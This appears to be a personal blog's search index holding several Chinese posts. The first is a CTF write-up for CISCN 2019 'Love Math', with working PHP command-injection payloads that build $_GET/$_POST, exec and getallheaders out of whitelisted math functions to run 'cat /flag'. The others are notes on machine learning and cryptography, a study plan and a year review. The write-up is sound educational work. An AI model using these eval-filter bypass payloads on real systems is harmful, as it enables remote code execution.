<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>\[CISCN 2019 初赛\]Love Math-总结数学中的命令执行</title>
      <link href="2021/03/06/web1-love-math/"/>
      <url>2021/03/06/web1-love-math/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul><li>开局给了源码 拿到本地分析一下<br><img src="https://i.loli.net/2021/03/06/oLhWucimrZ1tPB2.png" alt="1.png"></li></ul><p><img src="https://i.loli.net/2021/03/06/JiyeCSQMwdnHIXq.png" alt="2.png"></p><p><img src="https://i.loli.net/2021/03/06/V1DGCytmnK2Yai9.png" alt="3.png"></p><p>白名单只给了一堆数学函数<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br></pre></td></tr></table></figure></p><p>从里面找出来能够利用的拼凑出命令执行</p><p>最终肯定希望能够达成这样的结果<code>eval(&#39;echo&#39; . &#39;$_POST[1]&#39; . &#39;;&#39;)</code><br>所以难点在于如何利用已知函数来拼凑出$_POST</p><h3 id="几个函数"><a href="#几个函数" class="headerlink" title="几个函数"></a>几个函数</h3><ol><li>hex2bin — 转换十六进制字符串为二进制字符串</li><li>base_convert — 在任意进制之间转换数字，最高为36进制</li><li>dechex — 十进制转换为十六进制</li></ol><p>利用base_convert凑出来hex2bin,再利用hex2bin凑出来_POST,最后用可变变量完成命令执行</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">409369269076</span>));<span class="variable">$$pi</span>&#123;<span class="number">1</span>&#125;(<span class="variable">$$pi</span>&#123;<span class="number">2</span>&#125;)</span><br><span class="line"></span><br><span class="line">c=<span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>); <span class="comment">// base_convert(37907361743,10,36) = hex2bin</span></span><br><span class="line">dechex(<span class="number">409369269076</span>); <span class="comment">// 转成_POST字符串的十六进制</span></span><br><span class="line"></span><br><span class="line">以上两个语句合起来为 <span class="variable">$pi</span> = hex2bin(<span class="string">&#x27;5f504f5354&#x27;</span>) = _POST;</span><br><span class="line"></span><br><span class="line"><span class="variable">$$pi</span>&#123;<span class="number">1</span>&#125;(<span class="variable">$$pi</span>&#123;<span class="number">2</span>&#125;) = <span class="variable">$_POST</span>&#123;<span class="number">1</span>&#125;(<span class="variable">$_POST</span>&#123;<span class="number">2</span>&#125;); <span class="comment">// 中括号被ban,用大括号来绕过</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/06/oC6xULjHR1aP9kD.png" alt="4.png"></p><h2 id="其他payload"><a href="#其他payload" class="headerlink" title="其他payload"></a>其他payload</h2><h3 id="get传入参数命令执行"><a href="#get传入参数命令执行" class="headerlink" title="get传入参数命令执行"></a>get传入参数命令执行</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="variable">$abs</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));<span class="variable">$$abs</span>&#123;pi&#125;(<span class="variable">$$abs</span>&#123;sin&#125;)&amp;pi=system&amp;sin=cat /flag</span><br><span class="line"></span><br><span class="line"><span class="variable">$abs</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>)) = _GET;</span><br><span class="line"></span><br><span class="line"><span class="variable">$$abs</span>&#123;pi&#125;(<span class="variable">$$abs</span>&#123;sin&#125; = <span class="variable">$_GET</span>&#123;pi&#125;(<span class="variable">$_GET</span>&#123;sin&#125;); <span class="comment">// 通过get方法传入参数完成命令执行</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="headers传入参数命令执行"><a href="#headers传入参数命令执行" class="headerlink" title="headers传入参数命令执行"></a>headers传入参数命令执行</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="variable">$pi</span>=base_convert,<span class="variable">$pi</span>(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)((<span class="variable">$pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>))()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable">$pi</span>(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>) = base_convert(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>) = exec</span><br><span class="line">((<span class="variable">$pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>))()&#123;<span class="number">1</span>&#125;) = ((base_convert(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>))()&#123;<span class="number">1</span>&#125;) = getallheaders()&#123;<span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line">即 exec(getallheaders()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>几点说明</p><p>getallheaders — 获取全部 HTTP 请求头信息</p><p><img src="https://i.loli.net/2021/03/06/CcBEwGWhjMp9AmO.png" alt="5.png"></p><p>当取数组元素时，用大括号会抛出警告而不是错误</p><p><img src="https://i.loli.net/2021/03/06/WtgMeZJO6rl25QV.png" alt="6.png"></p><p>用上述payload 加上 postman改下headers即可命令执行getflag</p><p><img src="https://i.loli.net/2021/03/06/4kdNB8AUj59IiHu.png" alt="9.png"></p><h3 id="字符串异或命令执行"><a href="#字符串异或命令执行" class="headerlink" title="字符串异或命令执行"></a>字符串异或命令执行</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$whitelist</span> <span class="keyword">as</span> <span class="variable">$white</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">999999</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^_POST$/&quot;</span>,<span class="variable">$white</span> ^ decbin(<span class="variable">$i</span>),<span class="variable">$mach</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;decbin:&quot;</span> . <span class="variable">$i</span> . <span class="string">&#x27; : &#x27;</span> . <span class="variable">$white</span> . <span class="string">&#x27; : &#x27;</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            print_r(<span class="variable">$mach</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^_POST$/&quot;</span>,<span class="variable">$white</span> ^ decoct(<span class="variable">$i</span>),<span class="variable">$mach</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;decoct:&quot;</span> . <span class="variable">$i</span> . <span class="string">&#x27; : &#x27;</span> . <span class="variable">$white</span> . <span class="string">&#x27; : &#x27;</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            print_r(<span class="variable">$mach</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^_POST$/&quot;</span>,<span class="variable">$white</span> ^ dechex(<span class="variable">$i</span>),<span class="variable">$mach</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;dechex:&quot;</span> . <span class="variable">$i</span> . <span class="string">&#x27; : &#x27;</span> . <span class="variable">$white</span> . <span class="string">&#x27; : &#x27;</span> .  <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            print_r(<span class="variable">$mach</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/06/uGUmVAZe5BXbazM.png" alt="7.png"></p><p>发现俩能用的</p><p><code>payload:?c=$pi=dechex(481137)^hexdec;$$pi&#123;1&#125;($$pi&#123;2&#125;)</code></p><p><img src="https://i.loli.net/2021/03/06/y6aTOkVeDoFPcmC.png" alt="8.png"><br>picture/buuctf/love_math/8.png)</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote><p><a href="https://www.cnblogs.com/wangtanzhi/p/12246731.html">https://www.cnblogs.com/wangtanzhi/p/12246731.html</a><br><a href="https://www.bilibili.com/video/BV1pE411f7DN?t=1567">https://www.bilibili.com/video/BV1pE411f7DN?t=1567</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> web </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Machine Learning</title>
      <link href="2021/03/05/ML/"/>
      <url>2021/03/05/ML/</url>
      
        <content type="html"><![CDATA[<h2 id="1-4-Unsupervised-Learning"><a href="#1-4-Unsupervised-Learning" class="headerlink" title="1-4.Unsupervised Learning"></a>1-4.Unsupervised Learning</h2><p>google news：聚类算法，无监督学习算法</p><p><img src="https://i.loli.net/2021/03/06/1TFOpXztKCkwcrW.png" alt="image-20210306085443145.png"></p><p>聚类算法是unsupervised learning的一种</p><p><img src="https://i.loli.net/2021/03/06/r5F1CvS3Zx9bGOk.png" alt=""></p><blockquote><p>B is a unsupervised learning problem.</p></blockquote><h2 id="2-1-模型描述"><a href="#2-1-模型描述" class="headerlink" title="2-1.模型描述"></a>2-1.模型描述</h2><p><img src="https://i.loli.net/2021/03/06/fF3lQLcRgkxP5iW.png" alt=""></p><p>根据拟合状况预估房价，是一个supervised learning problem，因为每一个大小都有一个“正确的答案”，并且还是回归问题。</p><p>Notation:</p><ul><li>m = Number of training examples</li><li>x = “input” variable / features</li><li><p>y = “output” variable / “target” variable</p></li><li><p>(x,y) = one traing example</p></li><li><p>$(x^{(i)},y^{(i)})$ = $i^{th}$   training example (not exponentiation,i means “index”)</p></li><li><p>h = hypothesis</p></li></ul><p><img src="https://i.loli.net/2021/03/06/2EMSJuBbaqKs6oI.png" alt=""><br>Linear regression with one variable.Univariate linear regression.(one variable)</p><h2 id="2-2代价函数-一"><a href="#2-2代价函数-一" class="headerlink" title="2.2代价函数(一)"></a>2.2代价函数(一)</h2><p><img src="https://i.loli.net/2021/03/06/U9H7TZXSpEtYdaj.png" alt=""></p><p>Cost function  </p><script type="math/tex; mode=display">J(\theta_0,\theta_1)=\frac 1{2m}\sum_{i=1}^m(h_{\theta}(x^{(i)}-y^{(i)})^2</script><h2 id="2-3代价函数-二"><a href="#2-3代价函数-二" class="headerlink" title="2.3代价函数(二)"></a>2.3代价函数(二)</h2><p><img src="https://i.loli.net/2021/03/06/jwi5Mp2K8b3CLPq.png" alt=""></p><p><img src="https://i.loli.net/2021/03/06/4sFmDZuqdGVTi7S.png" alt=""></p><p>简化代价函数使得$\theta_0 = 0$，理解代价函数</p><p>对于上图特殊的training set，可以找出$\theta_1 = 1$时，可以完美拟合</p><h2 id="2-4代价函数-三"><a href="#2-4代价函数-三" class="headerlink" title="2.4代价函数(三)"></a>2.4代价函数(三)</h2><p>当我们使用$\theta_0$和$\theta_1$时，得到cost function图像类似下图</p><p><img src="https://i.loli.net/2021/03/06/skDZCp4OwtTFYib.png" alt=""></p><p>使用等高线的方式来模拟，想象从碗的上方向底部看，minimize J($\theta_0$,$\theta_1$) 就是椭圆的中心，如下图的数据拟合较为不错，cost value可以接受</p><p><img src="https://i.loli.net/2021/03/06/JVmZ7oFTpRDU1zd.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Machine Learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计划</title>
      <link href="2021/03/05/plan1/"/>
      <url>2021/03/05/plan1/</url>
      
        <content type="html"><![CDATA[<h2 id="计划2021-3-2021-5"><a href="#计划2021-3-2021-5" class="headerlink" title="计划2021.3 - 2021.5"></a>计划2021.3 - 2021.5</h2><blockquote><p>1.web学习<br>2.buu pwn题<br>3.机器学习入门<br>4.操作系统(李治军老师)<br>5.运维(hvv)</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学笔记</title>
      <link href="2021/03/05/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/"/>
      <url>2021/03/05/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="一-密码学概述"><a href="#一-密码学概述" class="headerlink" title="一.密码学概述"></a>一.密码学概述</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><strong>密码编码学</strong>和密码分析学</p><blockquote><p>Plaintext:明文，被隐蔽消息，M</p><p>Ciphertext:密文，C</p><p>Encryption:加密</p><p>Decryption:解密，加密的逆过程</p><p>Encryption algorithm: 加密算法，E()</p><p>Decryption algorithm: 解密算法，D()</p><p>Key: 密钥，控制加密和解密算法操作的数据处理，分别称作加密密钥和解密密钥，k</p></blockquote><ul><li>传统密码体制所用的加密密钥和解密密钥相同或<strong>实质上等同</strong>，从一个易于推出另一个：单钥或对称密码体制，无法实现不可否认性</li><li>加密密钥和解密密钥不相同，从一个难于推出另一个，双钥，或非对称密码体制</li></ul><p>密码体系是一个五元组(M C K E D)</p><p>密钥空间K，在单钥体制下K1 = K2 = K</p><p>加密变换$E_{k1}$</p><p>解密变换$D_{k2}$</p><p><strong>(M C K $E<em>{k1}$ $D</em>{k2}$)为保密通信系统</strong></p><p>密码分析者，选定变换函数h，对c进行变换，得到的明文是明文空间中的某个元素，</p><p>即$m’ = h(x)$</p><p>如果m’ = m，则分析成功</p><h3 id="保密系统基本要求"><a href="#保密系统基本要求" class="headerlink" title="保密系统基本要求"></a>保密系统基本要求</h3><ol><li>理论上不可破，即 $ p_r{m’=m}=0 $，当知道已知的明文密文时，要决定密钥或任意明文在计算上是不可行的</li><li>Kerchhoff原则，保密性不依赖于加密体制或算法的保密，而依赖于密钥</li><li>加密解密算法适用于所有密钥空间中的元素</li><li>系统便于实现和使用</li></ol><h3 id="密码系统的攻击"><a href="#密码系统的攻击" class="headerlink" title="密码系统的攻击"></a>密码系统的攻击</h3><ul><li>惟密文攻击</li><li>已知明文攻击</li><li>选择明文攻击</li><li>选择密文攻击</li></ul><div class="table-container"><table><thead><tr><th>攻击类型</th><th style="text-align:left">攻击者掌握的内容</th><th></th></tr></thead><tbody><tr><td>惟密文攻击</td><td style="text-align:left">加密算法，截获的部分密文</td><td></td></tr><tr><td>已知明文攻击</td><td style="text-align:left">以上及一个或多个明文密文对</td><td></td></tr><tr><td>选择明文攻击</td><td style="text-align:left">自己选择的明文消息及由密钥产生的密文</td><td></td></tr><tr><td>选择密文攻击</td><td style="text-align:left">自己选择的密文消息及相应的被解密的明文</td><td></td></tr><tr><td></td><td style="text-align:left"></td></tr></tbody></table></div><p>无条件安全：无论敌手截获多少密文，花费多长时间都不能解密密文 （一次一密</p><p>计算上安全：1，破译密文的代价超过被加密信息的价值。2，破译密文所花的时间超过信息的有用期。</p><h2 id="密码学发展"><a href="#密码学发展" class="headerlink" title="密码学发展"></a>密码学发展</h2><p>Cryptology - 密码学</p><blockquote><p>三个阶段：</p><p>1.1949之前：古典密码 艺术</p><p>2.1949-1975：近代密码 艺术-&gt;科学</p><p>3.1976年至今：现代密码</p></blockquote><p>古典密码：</p><ol><li>斯巴达棍。算法是缠绕，密钥是棍子的粗细。</li><li>单表代换密码：凯撒密码，单字母代换。算法是代换，密钥是密码表。</li><li>多表代换密码：Enigma密码机。</li></ol><p>近代密码：</p><ol><li>1977年，NBS颁布采纳IBM设计的方案作为非机密数据的数据加密标准DES，Data Encryption Standard。</li><li>2001.11.16，采用AES算法</li><li>1976，W.Diffie，M.E.Hellman，提出非对称密码算法思想</li><li>1977，Rivest，Shamir，Adleman提出RSA密码体制</li></ol><p>公钥密码学实现加密密钥和解密密钥的分离，伟大革命，使用两个密钥：公钥，私钥</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 校内课程笔记 </tag>
            
            <tag> Cryptography </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020年度总结</title>
      <link href="2021/03/05/2020%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
      <url>2021/03/05/2020%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="1-3月"><a href="#1-3月" class="headerlink" title="1-3月"></a>1-3月</h2><p>1-3月啥也不会，铁fw罢了，在学校摸摸鱼，电子人，电脑小白-.-</p><h2 id="3月"><a href="#3月" class="headerlink" title="3月"></a>3月</h2><p>接触网络安全源于一个电影，挺感兴趣的，在全网搜索相关文献资料啥的，也啥也不会，后来发现ctf比赛，想着学学吧，从web安全开始了，记得一开始是听的哔哩哔哩课程，什么从入门到入狱啥的，师傅其实讲的很好，那个时候学会了sql注入，xss啥的，不过只知道原理，并不会相关操作。<br>后来发现一个网站叫bugku，开始刷题了，一开始过程是自闭的，什么f12都不会，然后开始陆陆续续学JavaScript前端啥的，php和mysql也简单学学，后来面向wp做题有了一点点感觉。</p><h2 id="4-5月"><a href="#4-5月" class="headerlink" title="4-5月"></a>4-5月</h2><p>由于疫情的爆发没有开学，上网课，就很nice，然后就不听课，开始疯狂自学做题，当时啥都学早6点到晚12点左右，python php JavaScript linux …… 反正就是什么都会一点但是不精细。<br>后来打比赛，直接自闭了，认识了堆堆师傅，当时堆堆师傅主方向是web副方向是pwn，很羡慕，太羡慕pwn👴👴了，然后堆堆告诉我一个网站叫buuoj，让我开始做那个东西，然后就开始入坑buu了，记得第一道题好像是目录穿越还是反序列化不太记得了，从白天一直做到凌晨，各种抄wp复现，打击太大了，然后堆堆师傅凌晨4点多教我怎么做呜呜呜太感动了，然后告诉我说极客大挑战系列的题目比较简单，我就开始挑简单题做。然后从哔哩哔哩疯狂听课，后来学了两周misc，在MRCTF新生赛上出了一两个web和四五道misc，太满足了，第一次找到成就感，然后后来一个啥比赛又整自闭了。然后进入迷茫期。中间我帮七星师傅了录了一期长亭科技师傅做的pwn课程，那是什么鬼啊从头到尾全程懵逼，就硬生生给👴听睡着了。</p><h2 id="6-7月"><a href="#6-7月" class="headerlink" title="6-7月"></a>6-7月</h2><p>下学期快考试了，然后转专业啥的，由于上学期成绩还可以，然后就想着转个专业8，本来是想选网安的，但是竟然不能转因为是新开的专业啊可恶，然后又想转计科，但是看到人才培养方案发现网络专业竟然有安全课于是来到了网络专业，后话了（<br>然后快考试了，啥也没学这学期，开始疯狂补课，电路从第三章👴就没听懂过，猴博士yyds，高数二边听课边玩游戏，高数叔yyds。最终都考的还行。然后web方向面临瓶颈了，开始过渡pwn。<br>没有课程，从汇编开始学，贼痛苦，晚上做梦都是噩梦。反正那段时间挺难受的。<br>用了一段时间把wiki上的大部分栈知识点搞定之后开始冲刺堆部分。<br>怎么说呢，堆部分刚开始对于👴来说简直是地狱。没有学过数据结构，文献看不懂，又没有视频资料，七星师傅群里也没有pwn手，就很难受，当时星盟的一个师傅出了一套pwn课程，堆部分只有一丢丢，但是很满足了，慢慢啃wiki，最后还是学到了很多东西。</p><h2 id="8-9月"><a href="#8-9月" class="headerlink" title="8-9月"></a>8-9月</h2><p>旅游，各种玩耍，咕了</p><h2 id="9-12月"><a href="#9-12月" class="headerlink" title="9-12月"></a>9-12月</h2><p>下学期开始了，新班级，带了一个舍友开始学ctf，同班同学碰见一个特别强的师傅，后来认识了一下才知道这个师傅是计算机大类的系第一，高中就开始搞技术了，web手，膜。然后继续pwn，基本上一天两到三个buu吧，不会就记录查wp，技术上是有一定进步的，然后打了省的一个小比赛拿了一个二等奖，后来跟web师傅组队又打了一个线下赛拿了第一名，挺满意的。然后陆陆续续做题，把buu的一分pwn做完了，当时pwn总榜排名也进入前50了，然后就是复习课准备考试了，中间还成立了我们校的第一个ctf社团，感谢各位老师的支持和帮助</p><h2 id="2021"><a href="#2021" class="headerlink" title="2021"></a>2021</h2><p>最终寒假来了，摸了一个寒假，学了几天的运维</p><p>2021开学了，准备继续学pwn，堆部分还没有结束，还是跟师傅们差的太远，不过这一年认识很多hxd，校内师傅不用说了，堆堆师傅，七星师傅，雪殇师傅，Mz1师傅，Fz师傅，N神，低调的L0ne1y师傅等等，路很长，加油，共勉！</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>New</title>
      <link href="2021/03/05/New/"/>
      <url>2021/03/05/New/</url>
      
        <content type="html"><![CDATA[<h3 id="新博客！"><a href="#新博客！" class="headerlink" title="新博客！"></a>新博客！</h3><p>原博客地址：<a href="https://cnblogs.com/lemon629/">https://cnblogs.com/lemon629/</a></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
